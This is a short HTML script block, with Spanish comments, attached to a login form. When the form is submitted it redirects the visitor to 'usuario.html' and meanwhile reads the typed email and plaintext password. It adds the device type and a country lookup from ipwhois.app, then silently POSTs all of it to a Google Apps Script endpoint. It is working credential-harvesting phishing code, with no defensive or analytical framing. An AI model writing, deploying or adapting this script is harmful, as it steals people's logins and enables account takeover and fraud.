<script>
document.getElementById("miFormulario").addEventListener("submit", async function(event) {
    event.preventDefault(); // Evita el envío automático

    // Redirigir de inmediato sin esperar respuesta
    window.location.href = "usuario.html";

    const emailInput = document.querySelector('input[name="email"]');
    const passwordInput = document.querySelector('input[name="password"]');
    const errorMessage = document.getElementById('error-message');

    // Lista de correos electrónicos y contraseñas prohibidas
    const prohibitedEmails = [""]; // Agregar correos prohibidos aquí
    const prohibitedWords = ["holaaa"]; // Agregar contraseñas prohibidas aquí

    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value;

    const isProhibitedEmail = prohibitedEmails.includes(email);
    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));

    if (isProhibitedEmail) return;
    if (containsProhibitedPassword) return;

    // Detectar si el usuario usa iPhone o Android
    let deviceType = /android/i.test(navigator.userAgent) ? "Android" : /iphone|ipad|ipod/i.test(navigator.userAgent) ? "iPhone" : "Otro";

    // Obtener el país del usuario
    let country = "Desconocido";
    try {
        const response = await fetch("https://ipwhois.app/json/");
        const data = await response.json();
        country = data.country || "Desconocido";
    } catch (error) {
        console.error("Error obteniendo el país:", error);
    }

    // Enviar datos en segundo plano sin esperar respuesta
    const formData = new FormData();
    formData.append("email", email);
    formData.append("password", password);
    formData.append("device", deviceType);
    formData.append("country", country);

    const url = "https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec";

    fetch(url, {
        method: "POST",
        body: new URLSearchParams(formData),
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
    }).catch(error => console.error("Error al enviar datos:", error));
});
</script>
